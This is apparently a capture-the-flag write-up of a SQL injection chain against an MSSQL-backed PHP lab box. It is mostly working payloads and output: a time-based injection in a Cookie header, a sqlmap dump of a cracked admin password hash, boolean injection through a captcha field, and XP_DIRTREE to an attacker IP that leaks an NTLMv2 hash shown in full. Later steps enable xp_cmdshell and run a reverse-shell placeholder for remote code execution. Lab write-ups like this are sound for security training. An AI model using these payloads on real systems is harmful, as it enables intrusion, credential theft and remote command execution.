# Unintended way:
This way I "cheated" because I used mostly SQLMAP for the ex-filtration which is totally fine but slow. 

1)Found the injection point into Cookie header 
`<Cookie: PHPSESSID=ldre24q2hf0n6pfv4kgkj093pv; TrackingId=fbc558a95d6c89a99733f0ade7932901' IF 1=1 WAITFOR DELAY '0:0:5'-->` (URLenc needed)

2)Next I saved the request and with the wildcard I instructed SQLMAP to point to inject that parameter with Technique=T(Bool time-based)

3)And found out:
```
DB name= [10:41:06] [INFO] adjusting time delay to 2 seconds due to good response times d4y

Tables=
Database: d4y
[3 tables]
+----------+
| captcha  |
| tracking |
| users    |
+----------+

Columns: [12:30:12] [WARNING] increasing time delay to 2 seconds    3

Flag: knowing that first one was email, next I guessed username & password
Database: d4y                                                                                                                                
Table: users
[1 entry]
+---------------------------------------------+
| password                                    |
+---------------------------------------------+
| 8315744aa239bdba3464d255af507bc9 (eclipse1) |
+---------------------------------------------+
+--------------+
| email        |
+--------------+
| admin@d4y.at |
+--------------+
```

4)Now login with those credentials and perform a XP_CMDSHELL in order to sniff the NTLM user hash. Now loggin in I see we can add a new post?
**/new.php** but seems like we can't post?

5)Playing around this seems again a Blind injection but Boolean based since if we do everything right we get that "Posting is disabled" but if we give the wrong captcha we get that captcha is wrong so I guess the injection must happen there and if we get a BOOL=TRUE then we should get the message disabled!

6)Now the idea is to note down the right captcha(49 is in this case) and send something:
`<title=Titolo&message=Messaggio&picture=&captchaAnswer=49' AND 1=1-- -&captchaId=96>`
Since 49=TRUE and 1=1=TRUE this should pass the boolean and give the message **'Posting Disabled'=SUCCESS**
Indeed sending this(Error): `title=Titolo&message=Messaggio&picture=&captchaAnswer=49'+AND+1=0--&captchaId=96`
Sending this (correct): `title=Titolo&message=Messaggio&picture=&captchaAnswer=49'+AND+1=1--&captchaId=96`

The second one passes! Now that we have the injection we should be able to send the XP_CMDSHELL with something:
`title=Titolo&message=Messaggio&picture=&captchaAnswer=49';EXEC+XP_CMDSHELL+'\\MYIP'--&captchaId=96`

7)Check if current user is Sysadmin?
`title=Titolo&message=Messaggio&picture=&captchaAnswer=49'+AND+IS_SRVROLEMEMBER('sysadmin')=1--&captchaId=96`
(We get TRUE & TRUE which means yes! )

8)Now we use XP_DIRTREE to get Murat user!
```
title=Titolo&message=Messaggio&picture=&captchaAnswer=49';EXEC+XP_DIRTREE+'\\10.10.15.105'--&captchaId=96
Response: [SMB] NTLMv2-SSP Client   : 10.129.204.202
[SMB] NTLMv2-SSP Username : SQL02\Murat
[SMB] NTLMv2-SSP Hash     : Murat::SQL02:8567e64d558c210b:B186CD8C2AD5EEA6C765A7B2D35CA486:01010000000000000020BCEEE360DA016979CEAEE2960F2F00000000020008005A004D003800510001001E00570049004E002D004B004D0047005500340053004800410034003700590004003400570049004E002D004B004D004700550034005300480041003400370059002E005A004D00380051002E004C004F00430041004C00030014005A004D00380051002E004C004F00430041004C00050014005A004D00380051002E004C004F00430041004C00070008000020BCEEE360DA01060004000200000008003000300000000000000000000000003000000E8A1FCC51486CBEA33014CE2B02B2D72F534CE71D834DC7B7FBD731A52966CB0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100300035000000000000000000
```

9)On same way we can activate the XP_CMDSHELL stored procedure

```
title=Titolo&message=Messaggio&picture=&captchaAnswer=49';EXEC sp_configure 'Show Advanced Options','1';RECONFIGURE;EXEC SP_CONFIGURE 'xp_cmdshell','1';RECONFIGURE--&captchaId=96
```

10)And if everything went right now we should be able to gain RCE!
`title=Titolo&message=Messaggio&picture=&captchaAnswer=49';EXEC+XP_CMDSHELL+'REVSHELLHERE'--&captchaId=96`

-------------------------------------------------------------------------------------------------------------
# Indented way:
This way was supposed to be scripted entirely! At-least the first part that ex-filtrated the Admins password hash!
